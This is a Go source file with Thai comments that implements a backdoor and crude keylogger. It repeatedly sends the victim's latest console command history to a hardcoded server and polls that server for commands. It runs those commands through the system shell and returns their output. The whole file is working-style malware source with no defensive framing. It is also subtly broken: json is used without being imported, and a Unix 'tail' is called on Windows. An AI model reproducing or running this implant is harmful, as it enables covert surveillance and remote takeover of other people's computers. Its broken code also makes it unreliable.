package main

import (
	"bytes"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"golang.org/x/sys/windows" // สำหรับ Windows API
)

const serverURL = "http://192.168.0.104:8080/stream" // <<< แก้ IP ตรงนี้
const commandURL = "http://192.168.0.104:8080/command"

func sendLog(data []byte) {
	resp, err := http.Post(serverURL, "text/plain", bytes.NewBuffer(data))
	if err != nil {
		// ถ้าเน็ตเสีย ให้บันทึกไฟล์ไว้ก่อน
		os.WriteFile("keylog_backup.txt", data, 0644)
	} else {
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}
}

func runCommand(cmd string) string {
	c := exec.Command("sh", "-c", cmd)
	if runtime.GOOS == "windows" {
		c = exec.Command("cmd", "/C", cmd)
	}
	out, _ := c.CombinedOutput()
	return string(out)
}

func getKeyboardInput() string {
	// วิธีง่ายๆ ในการดักจับคีย์บอร์ดใน Go บน Windows คือการใช้ GetAsyncKeyState
	// แต่เพื่อความง่าย ผมจะใช้วิธีอ่าน Clipboard หรือ History แทน
	// ถ้าต้องการ Keylogger จริงๆ ต้องใช้ Hook API ซึ่งซับซ้อนกว่านี้มาก
	
	// ตัวอย่าง: อ่านคำสั่งล่าสุดจาก Console
	if runtime.GOOS == "windows" {
		return runCommand("doskey /history | findstr /v \"^$\" | tail -n 1")
	}
	return runCommand("history | tail -n 1")
}

func main() {
	id := "host-" + os.Getenv("COMPUTERNAME")
	if id == "host-" {
		id = "host-" + os.Getenv("HOSTNAME")
	}

	// ส่งข้อมูลเริ่มต้น
	sendLog([]byte(fmt.Sprintf("[INIT] Started on %s | PID: %d\n", id, os.Getpid())))

	// Loop หลัก
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			// 1. ดักจับคีย์บอร์ด/คำสั่ง
			keyInput := getKeyboardInput()
			if keyInput != "" {
				sendLog([]byte(fmt.Sprintf("[%s] %s", time.Now().Format("15:04:05"), keyInput)))
			}

			// 2. รับคำสั่งจาก Server (Backdoor)
			resp, err := http.Get(fmt.Sprintf("%s?id=%s", commandURL, id))
			if err == nil {
				defer resp.Body.Close()
				var result map[string]string
				if err := json.NewDecoder(resp.Body).Decode(&result); err == nil {
					if cmd, ok := result["command"]; ok && cmd != "" {
						output := runCommand(cmd)
						sendLog([]byte(fmt.Sprintf("[CMD_OUT] %s\n%s", cmd, output)))
					}
				}
			}
		}
	}
}
